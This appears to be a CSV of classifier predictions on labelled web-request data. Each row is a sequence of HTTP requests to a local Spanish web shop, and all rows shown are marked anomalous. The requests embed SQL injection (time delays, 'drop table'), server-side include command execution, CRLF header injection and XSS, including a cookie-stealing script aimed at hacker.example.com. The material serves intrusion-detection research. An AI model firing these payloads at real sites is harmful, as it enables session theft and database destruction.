data,y_pred,y_test
"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=houdini&password=cabile�a&nombre=yulisa&apellidos=<!--#exec+cmd=""ls+/""-->&email=hee4@ropadegolf.name&dni=77786356b&direccion=c/+guatemala,+s/n,+6g&ciudad=j�vea/x�bia&cp=39790&provincia=zaragoza&ntc=2661491792098457&b1=registrar gethttp://localhost:8080/tienda1/global/menum.jsp/asf-logo-wide gethttp://localhost:8080/tienda1/miembros/asf-logo-wide.java gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=any%3f%0aset-cookie%3a+tamper%3d5765205567234876235 gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9800&b1a=confirmar posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioa=4564&b1=confirmar posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=gorbergany%0d%0aset-cookie%3a+tamper%3d5765205567234876235&password=c8516o&nombre=tranquilidad&apellidos=tur+presseguer&email=bird@tiebreak.com.nl&dni=67107231q&direccion=moli+del+comte+6,+5?b&ciudad=pinilla+del+campo&cp=49177&provincia=huesca&ntc=5056772998662115&b1=registrar gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&logina=hiroyuki&password=desbullar&nombre=yoconda&apellidos=rosas+fabila&email=saiko@enlanzarote.com.cx&dni=29372836l&direccion=barriada+juan+xxiii,+100,+&ciudad=almargen&cp=03812&provincia=toledo&ntc=2218102599227615&b1=registrar posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=""+and+""1""=""1",anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico.inc gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=lynelle&password=lazada&nombre=simei&apellidos=cam�+tordera&email=bjerg.sevillano@@mc@gt.@gs&dni=37903163z&direccion=poligono+cortijo+real+169,+&ciudad=leda�a&cp=31263&provincia=segovia&ntc=1351127649843855&b1=registrar posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modoa=entrar&login=lorli&pwd=guipuscoano&remember=on&b1=entrar posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=marconi1&password=adularia&nombre=venancio&apellidos=del+campillo+aranda&email=blier@ropadegolf.com.at&dni=b421621b19z&direccion=paratge+pla+18+8?d&ciudad=sotorribas&cp=15391&provincia=soria&ntc=6078216616409598&b1=registrar gethttp://localhost:8080.bak posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=schafer&password=7li7e37r06&nombre=santos&apellidos=ricciardiello+ameller&email=kelz@animationproject.be&dni=08841812z&direccion=');waitfor+delay+'0:0:15';--&ciudad=huarte/uharte&cp=37488&provincia=c�ceres&ntc=7240523818698482&b1=registrar gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=queso+manchego&precio=39&cantidad=88&b1a=a�adir+al+carrito gethttp://localhost:8080/asf-logo-wide.bak posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1715&b1=confirmar/ gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=any%3f%0aset-cookie%3a+tamper%3d5765205567234876235",anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=jam�n+ib�rico','0','0','0');waitfor+delay+'0:0:15';--&precio=39&cantidad=22&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=801&b1=pasar+por+caja/ gethttp://localhost:8080/busytime.nsf gethttp://localhost:8080/asf-logo-wide.gif/.java puthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=usa9&password=enjuagadientes&nombre=johana&apellidos=colldevall&email=scepi@14horas.ao&dni=04746545n&direccion=aldea+172,+&ciudad=villota+del+p�ramo&cp=43694&provincia=la+rioja&ntc=0365839887327935&b1=registrar gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=mylo&password=so3pa&nombre=lienhard&apellidos=pedragosa+gasc�&email=chatinover@prestoesesto.zm&dni=22456953y&direccion=fideus,+75+&ciudad=usagre&cp=08281&provincia=badajoz&ntc=904630891355868a&b1=registrar posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioa=4250&b1=pasar+por+caja posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=bob@<script>alert(paros)</script>.parosproxy.org gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam�n+ib�rico&precio=100/&cantidad=68&b1=a�adir+al+carrito posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=queso+manchego&precioa=100&cantidad=2&b1=a�adir+al+carrito",anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1 gethttp://localhost:8080/tienda1/publico/pagar.jsp.java gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1 gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3/&nombre=vino+rioja&precio=100&cantidad=22&b1=a�adir+al+carrito posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas gethttp://localhost:8080/tienda1/publico/registro.jsp?modoa=registro&login=beaumont&password=s9leva398d59&nombre=rudy&apellidos=auladell+quint�s&email=garrick-overton@corjet.gd&dni=15467411a&direccion=c/+quasimodo+95+13?e&ciudad=arbanc�n&cp=37622&provincia=zamora&ntc=7990892411881647&b1=registrar gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=""+and+""1""=""1&password=surca�*o&nombre=emerio&apellidos=abajo+witron&email=ammelrooy@mariposasentudia.travel&dni=46405415v&direccion=avinguda+puigfred+108,+&ciudad=san+crist�bal+de+la+cuesta&cp=09471&provincia=valencia&ntc=0824087698765397&b1=registrar puthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mathews&pwd=6u1ad5&remember=on&b1=entrar posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito gethttp://localhost:8080/cfide/administrator/login.cfm",anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=kessing6&pwd=z76al�4&remember=on/&b1=entrar posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas<!--#include+file=""archivo_secreto""+--> gethttp://localhost:8080/tienda1/miembros/salir.jsp/ posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=pistilli&password=pervertimiento&nombre=delfo&apellidos=berzoni+arzaluz&email=starkey@mcfly.kg&dni=29973823q&direccion=';waitfor+delay+'0:0:15';--&ciudad=cabez�n+de+cameros&cp=28691&provincia=teruel&ntc=7673189630192545&b1=registrar gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=montijo&password=remot4&nombre=mailena&apellidos=buj+andunce&email=griffel@camilafansite.pt&dni=93865245zsessionid=12312312&+username=<script>document.location='http://hacker+.example.com/cgi-bin/cookiesteal.cgi?'++document.cookie</script>&direccion=doctor+ulecia,+158+&ciudad=valdunquillo&cp=31498&provincia=tarragona&ntc=5319876028160549&b1=registrar gethttp://localhost:8080/tienda1/miembros/imagenes/ogono.jpg/asf-logo-wide.gif.old posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2','0','0','0');waitfor+delay+'0:0:15';-- gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=');waitfor+delay+'0:0:15';-- posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=vanderbi&password=brechar&nombre=rudolph&apellidos=simo+baixaul�&email=guarneros@elfisioencasa.euany%3f%0aset-cookie%3a+tamper%3d5765205567234876235&dni=07929654j&direccion=d'+irlanda,+150,+4g&ciudad=cru�lles,+monells+i+sant+sadurn�+de+l'heura&cp=22362&provincia=palencia&ntc=7146200335863301&b1=registrar gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito",anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=and+1=1 posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=kumamoto&password='4,,angane-3a&nombre=nelo&apellidos=marceni�o&email=touliatos@intercambiodeenlaces.hr&dni=19782082n&direccion=c/+andres+bello,+92,+6c&ciudad=alamedilla&cp=13670&provincia=guadalajara&ntc=2637234925036276&b1=registrar puthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2939&b1=pasar+por+caja gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=kuchinsk&pwd=rogadora&remember=off&b1a=entrar gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mile&pwd=des9i852d268&remembera=off&b1=entrar gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2','0','0','0');waitfor+delay+'0:0:15';-- gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1<!--#exec+cmd=""ls+/""--> gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&logina=skef&pwd=p9o832o50&remember=off&b1=entrar posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1 posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito",anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ohma++ru&pwd=m893e787&remember=on&b1=entrar posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=haslach&password=vicepresidencia&nombre=johanna&apellidos=turet+maiorana&email=dann@comodepilarse.bm&dni=b58351562x&direccion=calle+federico+garcia+lorca+125,+5f&ciudad=trijueque&cp=18370&provincia=valladolid&ntc=5980578835652904&b1=registrar gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=';+drop+table+usuarios;+select+*+from+datos+where+nombre+like+'%&b1=confirmar posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrarany%3f%0aset-cookie%3a+tamper%3d5765205567234876235&login=sheila&pwd=culero&remember=on&b1=entrar posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=gordy&password=malcomida&nombre=cebele&apellidos=palah�+cabezas&email=capoliccio@almeriastella.jo&dni=94088087d&direccion=c/+dels+escales+del+miracle,+37,+7-f&ciudad=arbanc�n&cp=31229&provincia=cantabria&ntc=229846231825930&b1=registrar posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2 gethttp://localhost:8080/webapp/examples/login.html gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=eluned&pwd=p8pah7g6&remember=on&b1a=entrar posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1 gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1",anomalous,anomalous
"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=dajerlin&password=3o172a1i0m6n19&nombre=carmen&apellidos=bordas+rubies&email=carves@travelzone.hn&dni=59561138q&direccion=calle+morera,+139,+8g&ciudad=funes&cp=17143&provincia=toledo&ntc=9899066630450137'or'a='a&b1=registrar gethttp://localhost:8080/tienda1/asf-logo-wide.gif/.bak gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=shigeki&pwd=/al'op�tico&remember=on&b1=entrar posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam�n+ib�rico&precio=85&cantidad=68&b1=a�adir+al+carrito%3f gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=|&login=swidersk&password=balarrasa&nombre=yaco&apellidos=moriana+romanov&email=sintes@noticiasenvivo.mz&dni=58500108e&direccion=c/+parque+iguazu+99,+&ciudad=ag�imes&cp=48940&provincia=valencia&ntc=3622353817159390&b1=registrar posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=ques+o+manchego&precio=39&cantidad=33&b1=a�adir+al+carrito posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=beate&pwd=esp8rtillero&remember=off&b1=%00 gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=asbjorn&pwd=virulenta&remember=on&b1=entrar%3cscript%3ealert%28%22paros%22%29%3b%3c%2fscript%3e gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&logina=durward&pwd=cordelazo&remember=on&b1=entrar posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=bienek&password=bujer�a&nombre='+and+'1'='1&apellidos=gesto+ball�n&email=halloran@sanchezgordo.pa&dni=23139426t&direccion=c/+arco+de+las+orejas+76,+3?f&ciudad=torrehermosa&cp=29494&provincia=guadalajara&ntc=2829438543802993&b1=registrar",anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%7c&precio=9823&b1=confirmar gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=gisell*+a&pwd=pin90&remember=off&b1=entrar gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectasbob%40%3cscript%3ealert%28paros%29%3c%2fscript%3e.parosproxy.org gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=burdette&password=alm3donad6&nombre=luciliano&apellidos=maroto+fancelli&email=voldstad3@enlapalma.com.gy&dni=89061921x&direccion=c/+rams,+70+11-f&ciudad=hornillos+de+cameros&cp=19119&provinciaa=burgos&ntc=2545576057068640&b1=registrar posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=vino+rioja&precio=bob@<script>alert(paros)</script>.parosproxy.org&cantidad=66&b1=a�adir+al+carrito posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=antinucc&password=zullarse&nombre=jos�+mar�a&apellidos=rodrigo+ambr�s&email=leibman@softstylestudio.be&dnia=90993097z&direccion=urbanizacion+residencial+ronda+36+9?b&ciudad=riells+i+viabrea&cp=42150&provincia=teruel&ntc=9974355200418178&b1=registrar gethttp://localhost:8080/tienda1/publico/pagar.jsp?modoa=insertar&precio=4828&b1=confirmar gethttp://localhost:8080/tienda1/publico/miembros.jsp.java gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carritosessionid=12312312&+username=<script>document.location='http://hacker+.example.com/cgi-bin/cookiesteal.cgi?'++document.cookie</script>",anomalous,anomalous
gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=vino+rioja&precio=100/&cantidad=59&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/publico/registro.jsp?modoa=registro&login=jenn&password=afrancesamiento&nombre=ada&apellidos=matar�+i�iguez&email=newfield.watase@cortinasartesol.yu&dni=75678701f&direccion=calle+sol+188+9-h&ciudad=santo+domingo+de+la+calzada&cp=45179&provincia=albacete&ntc=9167215819238112&b1=registrar gethttp://localhost:8080/cfide/administrator/checkfile.cfm gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=jam�n+ib�rico&precio=100&cantidad=40&b1a=a�adir+al+carrito posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=lendon&pwd=silici0&remember=on&b1a=entrar gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2/&nombre=queso+manchego&precio=100&cantidad=30&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=salsber+y&pwd=7u63ira681&remember=on&b1=entrar gethttp://localhost:8080/tienda1/global/menum.jsp.bak posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4903&b1=pasar+por+caja/ gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modoa=entrar&login=dar-der&pwd=caser�a&remember=on&b1=entrar,anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=uunko7&password=chopal&nombre=tr�nsito&apellidos=c/onesa+zengle,in&email=bagdasarian@lola-lutscht.pe&dni=88623470p&direccion=carrer+trieta+125+&ciudad=calles&cp=25440&provincia=teruel&ntc=5617420571078816&b1=registrar gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=540&b1=confirmar/ posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6541&b1=pasar+por+caja/ gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=mcgee','0','0');waitfor+delay+'0:0:15';--&password=ab*rigadero&nombre=salom�n&apellidos=castany+bigorra&email=karapiet@novaservicios.gr&dni=02030491m&direccion=mantua+35,+&ciudad=instinci�n&cp=28512&provincia=navarra&ntc=1541713650880969&b1=registrar gethttp://localhost:8080/tienda1/publico/pagar.jsp?modoa=insertar&precio=5934&b1=confirmar posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=85/&cantidad=17&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/global/estilos.css.old posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2bob@<script>alert(paros)</script>.parosproxy.org gethttp://localhost:8080/tienda1/publico/miembros.jsp.old posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=janey&password=3s3&nombre=candela&apellidos=bote+montijo&email=despotovich.thalbach@easyviaggio.by&dni=06425800z&direccion=ronda+del+general+mitre+s/n,+&ciudad=porto+do+son&cpa=17143&provincia=palencia&ntc=8776652546820108&b1=registrar",anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=dann&pwd=pate1a&remember=off/&b1=entrar gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=leonerd&password=6a6o57a&nombre=christopher&apellidos=silva&email=havoc8@g-audi.eg&dni=56405919y&direccion=c/+miquel+palomares,+73+7?c&ciudad=bidegoian&cp=16415&provincia=almer�a&ntc=7329932302042221&b1=registrar'injected_param posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=b'il?+i&password=as6m1r&nombre=d�maso&apellidos=basas+soto&email=alejandro-kurgic@repretexbcn.cy&dni=69198356g&direccion=av.+valdecilla,+s/n+10-b&ciudad=robladillo&cp=31520&provincia=la+rioja&ntc=7775887552046645&b1=registrar gethttp://localhost:8080/servlet/hello posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=ques+o+manchego&precio=100&cantidad=13&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=glancey&password=filol�gicamente&nombre=yago&apellidos=bartra+bergu�o&email=kaminski@lola-lutscht.cf&dni=48258022c&direccion=chalets+de+la+tierruca,+118+8-f%20&ciudad=valls&cp=50691&provincia=ciudad+real&ntc=8042027288739194&b1=registrar gethttp://localhost:8080/tienda1/publico/productos.jsp/4861362529278789730~ gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3237&b1a=pasar+por+caja gethttp://localhost:8080/tienda1/global/menum.jsp.inc gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=coloads""+and+""1""=""1&pwd=riosellano&remember=off&b1=entrar",anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/pagar.jsp?modoa=insertar&precio=9168&b1=confirmar posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=lorli&pwd=ene668,838,6&remember=on&b1=entrar gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8146','0');waitfor+delay+'0:0:15';--&b1=confirmar gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=uunko7&password=chopal&nombre=tr�nsito&apellidos=c/onesa+zengle,in&email=bagdasarian@lola-lutscht.pe&dni=88623470p&direccion=carrer+trieta+125+&ciudad=calles&cp=25440&provincia=teruel&ntc=5617420571078816&b1=registrar posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2/&nombre=jam�n+ib�rico&precio=85&cantidad=45&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/miembros/salir.jsp/4861362529278789730.old gethttp://localhost:8080/_private/ posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam�n+ib�rico&precio=85&cantidad=32&b1a=a�adir+al+carrito posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=lynelle&password=lazada&nombrea=simei&apellidos=cam�+tordera&email=deane@micaelagriga.ae&dni=37903163z&direccion=poligono+cortijo+real+169,+&ciudad=leda�a&cp=31263&provincia=segovia&ntc=1351127649843855&b1=registrar posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito",anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=39/&cantidad=47&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/publico/carrito.jsp/ posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectassessionid=12312312&+username=<script>document.location='http://hacker+.example.com/cgi-bin/cookiesteal.cgi?'++document.cookie</script> gethttp://localhost:8080/asf-logo-wide.gif~ gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5698&b1=pasar+por+caja';waitfor+delay+'0:0:15';-- gethttp://localhost:8080/tienda1/miembros/editar.jsp/asf-logo-wide.gif/.old gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id='+and+'1'='1 gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=cathal&password=ce/re_b56l&nombre=apeles&apellidos=capafons+melgarejo&email=crane7@privatebanking.com.nc&dni=80723845d&direccion=c/+doctor+sanchez+cozar,+88,+&ciudad=herrera,+la&cp=24100&provincia=lleida&ntc=9690651027798587&b1=registrar gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=jam�n+ib�rico&precio=100/&cantidad=15&b1=a�adir+al+carrito posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ar*d*e?lle&pwd=48a4ta4i�5&remember=off&b1=entrar",anomalous,anomalous
